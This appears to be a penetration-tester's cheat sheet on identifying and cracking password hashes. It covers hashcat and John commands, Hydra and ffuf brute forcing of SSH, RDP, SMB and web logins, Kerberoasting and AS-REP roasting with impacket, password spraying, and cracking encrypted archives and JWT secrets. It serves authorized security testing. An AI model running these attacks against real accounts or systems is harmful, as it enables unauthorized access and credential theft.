# 10 — Cracking & Hashes

Identifying, extracting, and cracking hashes is its own discipline. Done right, it's a force-multiplier — a single dictionary attack converts a sea of hashes into reusable creds.

---

## 1. Hash Identification

### 1.1 Visual indicators
| Prefix / format | Algorithm |
|-----------------|-----------|
| `$1$...` | md5crypt (Linux old) |
| `$2a$`, `$2b$`, `$2y$` | bcrypt |
| `$5$...` | sha256crypt |
| `$6$...` | sha512crypt (Linux modern) |
| `$y$...` | yescrypt (Linux newest) |
| `$P$...` / `$H$...` | phpass (WordPress, vBulletin) |
| `$apr1$` | Apache MD5 (htpasswd) |
| `$argon2id$` | Argon2 |
| `$pbkdf2-sha256$` | PBKDF2 |
| 32 hex chars | likely MD5 or NTLM |
| 40 hex chars | SHA1 |
| 64 hex chars | SHA256 |
| 128 hex chars | SHA512 (raw) |
| `*` followed by 40 hex | MySQL 4.1+ |
| `aad3b435...:` followed by hash | LM:NTLM (LM may be empty) |

### 1.2 Tools
```bash
hashid -m '<hash>'        # multiple guesses with hashcat mode numbers
hash-identifier           # interactive, older
```
hashid is more accurate; use it first.

### 1.3 NetNTLMv1 vs NetNTLMv2 (responder captures)
NetNTLMv2 (most common):
```
user::DOMAIN:1122334455667788:<24-byte-resp>:<blob>
```
NetNTLMv1 (rare, older):
```
user::DOMAIN:<lm-resp>:<nt-resp>:1122334455667788
```
hashcat modes: `5500` (v1), `5600` (v2).

---

## 2. Hashcat — Comprehensive Cheat

### 2.1 Mode numbers (high-yield)
| Mode | Hash type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 1100 | Domain Cached Credentials (DCC) |
| 2100 | DCC2 (mscash2) |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS-REP (kerberoast) |
| 18200 | Kerberos AS-REP (asreproast) |
| 19600 | Kerberos TGS-REP, AES128 |
| 19700 | Kerberos TGS-REP, AES256 |
| 500 | md5crypt ($1$) |
| 1800 | sha512crypt ($6$) |
| 7400 | sha256crypt ($5$) |
| 3200 | bcrypt ($2*$) |
| 400 | phpass ($P$, $H$) |
| 16500 | JWT HS256 |
| 11600 | 7-Zip |
| 12500 | RAR3-hp |
| 13000 | RAR5 |
| 13400 | KeePass |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |
| 9400–9800 | Office 2007–2013 |
| 17200–17225 | PDF |
| 6800 | Lastpass |

### 2.2 Common runs
```bash
# Straight wordlist
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

# Wordlist + rule
hashcat -m 1800 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Wordlist + d3ad0ne (heavier, good results)
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Mask (brute) — 8-char alphanumeric
hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Hybrid (wordlist + mask)
hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d

# Show cracked
hashcat -m 1000 hash.txt --show

# Resume
hashcat --restore
```

### 2.3 Mask charsets
| Token | Charset |
|-------|---------|
| `?l` | a-z |
| `?u` | A-Z |
| `?d` | 0-9 |
| `?s` | special chars |
| `?a` | all printable |
| `?b` | 0x00-0xff |
| `?h` | hex lowercase |
| `?H` | hex uppercase |

Custom: `--custom-charset1 ?l?u?d` then `?1?1?1?1`.

### 2.4 Useful rules
- `best64.rule` — quick, good baseline (default in many cases)
- `d3ad0ne.rule` — heavy mutations
- `OneRuleToRuleThemAll.rule` — community mega-rule
- `dive.rule` — extreme

### 2.5 Speed tips
- `--workload-profile=4` for max GPU (will heat).
- `--optimized-kernel-enable` (`-O`) — limits mask length but ~3x faster.
- Run on dedicated GPU machine if possible.

---

## 3. John the Ripper — Quick

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=Raw-MD5 --wordlist=rockyou.txt hash.txt
john --show hash.txt
# rules
john --wordlist=rockyou.txt --rules=KoreLogic hash.txt
```

John formats are auto-detected for many types. For non-standard:
```bash
zip2john file.zip > file.hash
rar2john file.rar > file.hash
ssh2john id_rsa > id_rsa.hash
keepass2john file.kdbx > file.hash
office2john file.docx > file.hash
pdf2john file.pdf > file.hash
```

---

## 4. Online Brute Forcing (Hydra / Medusa / Ncrack)

### 4.1 Hydra
```bash
# SSH
hydra -l user -P rockyou.txt ssh://<ip> -t 4

# FTP
hydra -L users -P passes ftp://<ip>

# HTTP basic
hydra -l admin -P rockyou.txt <ip> http-get /admin

# HTTP form (POST)
hydra -L users -P passes <ip> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# HTTP form (with cookie)
hydra -l admin -P passes <ip> http-post-form \
  "/login:csrf=abc123&user=^USER^&pass=^PASS^:H=Cookie\: session=xyz:F=Invalid credentials"

# RDP
hydra -l admin -P passes rdp://<ip>

# SMB
hydra -l admin -P passes smb://<ip>
```

### 4.2 ffuf for web logins (often more flexible)
```bash
ffuf -w passes.txt:PASS -X POST -d 'user=admin&pass=PASS' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -u http://<ip>/login -fr 'Invalid'
```
Filter via `-fr` (response regex), `-fs`, `-fc`, `-fl`, `-fw`.

### 4.3 Lockout awareness
- Modern targets lock or rate-limit on N failures. Verify before mass spray.
- `crackmapexec smb <ip> --pass-pol` reads policy.
- Spray *one password across many users*, not vice versa.

---

## 5. Wordlists & Rules — Pragmatic Picks

### 5.1 Wordlists
| Use | List |
|-----|------|
| Default English passwords | `rockyou.txt` |
| Big English | `crackstation-human-only.txt`, `weakpass_4` |
| Modern leaks | `Pwnagotchi`/HIBP downloadable |
| Targeted (custom) | `cewl`, `cupp`, names + years |

### 5.2 cupp (custom user profiler)
```bash
cupp -i      # interactive prompts: name, partner, kids, dog, etc.
```
Pulled-from-target lists (real names + birthdays + company terms) crack better than rockyou for mid-policy passwords.

### 5.3 cewl (scrape site)
```bash
cewl http://<host>/ -d 3 -m 5 -w site.txt
```
Combine with mutations:
```bash
hashcat --stdout site.txt -r best64.rule > site-mutated.txt
```

### 5.4 Username lists
- `xato-net-10-million-usernames.txt`
- `Names/names.txt` (SecLists)
- Custom: `firstname.lastname`, `flastname`, `firstnamel` from LinkedIn / company directory.

---

## 6. KRB5 Specifics

### 6.1 AS-REP roasting (no creds)
```bash
impacket-GetNPUsers acme.local/ -dc-ip <dc> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt -r best64.rule
```

### 6.2 Kerberoasting (need any user creds)
```bash
impacket-GetUserSPNs acme.local/user:'pass' -dc-ip <dc> -request -outputfile kerb.hashes
hashcat -m 13100 kerb.hashes rockyou.txt -r best64.rule
```
Service-account passwords are often weaker / older — high crack rate.

---

## 7. NTLM Relay vs Crack — Decision

Captured a NetNTLMv2 hash via responder. Two paths:
- **Relay** to another host (no SMB signing) — direct authenticated access (no crack needed).
- **Crack** offline if target requires signing or you have nowhere useful to relay.

Relay is faster when possible. Cracking is the fallback.

---

## 8. Hash Cracking Workflow (Practical)

1. **Identify** the hash → know the mode.
2. **Quick wins first**:
```bash
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
```
3. **Rules**:
```bash
hashcat -m <mode> hash.txt rockyou.txt -r best64.rule
```
4. **Bigger lists / heavier rules** if not cracked:
```bash
hashcat -m <mode> hash.txt crackstation.txt -r d3ad0ne.rule
hashcat -m <mode> hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```
5. **Targeted lists** from cewl/cupp.
6. **Mask attacks** (mid-length, structured patterns, e.g., `Company2023!`):
```bash
hashcat -m <mode> hash.txt -a 3 'Company?d?d?d?d!'
```
7. **Hybrid**:
```bash
hashcat -m <mode> hash.txt -a 6 base.txt ?d?d?d
hashcat -m <mode> hash.txt -a 7 ?d?d?d base.txt
```
8. **Exhaust resources** (multi-day brute) only if value justifies.

---

## 9. Encrypted File Cracking

### 9.1 ZIP / RAR / 7z
```bash
zip2john file.zip > z.h && john --wordlist=rockyou.txt z.h
rar2john file.rar > r.h && john --wordlist=rockyou.txt r.h
7z2john.pl file.7z > s.h && john --wordlist=rockyou.txt s.h
# hashcat:
hashcat -m 13600 z.h rockyou.txt
```

### 9.2 KeePass
```bash
keepass2john file.kdbx > kp.h
hashcat -m 13400 kp.h rockyou.txt
```

### 9.3 Office docs
```bash
office2john file.docx > o.h
hashcat -m 9400 o.h rockyou.txt        # 2007
hashcat -m 9500 o.h rockyou.txt        # 2010
hashcat -m 9600 o.h rockyou.txt        # 2013
```

### 9.4 PDF
```bash
pdf2john file.pdf > p.h
hashcat -m 10500 p.h rockyou.txt       # PDF 1.4-1.6
hashcat -m 10700 p.h rockyou.txt       # PDF 1.7 with AES-256
```

### 9.5 SSH keys
```bash
ssh2john id_rsa > i.h
john --wordlist=rockyou.txt i.h
hashcat -m 22921 i.h rockyou.txt       # SSH-Key/RSA, depending on type
```

---

## 10. JWT Cracking

```bash
# convert JWT to hashcat-friendly:
echo 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYSJ9.signature' > jwt.txt
hashcat -m 16500 jwt.txt rockyou.txt -r best64.rule
```
If it cracks, you can forge any JWT yourself.

---

## 11. Pre-Computed (Rainbow) Tables

Mostly relevant for unsalted hashes (raw MD5/NTLM). Modern salted hashes (bcrypt, sha512crypt) make rainbow tables irrelevant.

- https://crackstation.net/ — paste a hash, instant lookup
- HIBP NTLM dumps for AD audits

---

## 12. Hardware Considerations

- **CPU only**: john is fine for small jobs, slow for big.
- **Single GPU (consumer)**: hashcat dominates.
- **Multi-GPU rig**: `hashcat -d 1,2,3,4`. NTLM, MD5 → billions of guesses per second.
- **Cloud** (real engagements only, w/ approval): ephemeral GPU instances for big jobs.

Rough sense-of-scale on a single RTX 3090:
- NTLM: ~70 GH/s
- MD5: ~70 GH/s
- SHA1: ~22 GH/s
- bcrypt cost-12: ~100 H/s (yes, hundreds — bcrypt is by design slow)
- Kerberos TGS-REP: ~1 GH/s

Translation: 8-char NTLM is hours. 8-char bcrypt is *years*.

---

## 13. Common Pitfalls

- Wrong mode → no cracks. Double-check with `hashid` / hash-format docs.
- Using rockyou unrules-d on enterprise hashes → too narrow. Always at least `best64.rule`.
- Not separating multiple hashes per file (each on its own line) → hashcat won't behave.
- Forgetting to strip surrounding `$DCC2$10240#user#...` prefix when format is wrong.
- Salting sensitivity: NetNTLMv2 hashes are challenge-bound; you can't reuse `1122334455667788` arbitrarily.

---

## 14. Quick Reference

```bash
# Identify
hashid -m 'hash'

# Hashcat smoke run
hashcat -m <mode> hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John smoke run
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Online (be cautious)
curl -s https://hashes.com/api/search?hash=<hash>     # public DB lookup

# Spray
crackmapexec smb <range> -u users.txt -p 'P@ssw0rd!' --continue-on-success
```

---

*Cracking is a probability game. Tune wordlist and rules to the target's likely password patterns; weak service accounts crumble first.*
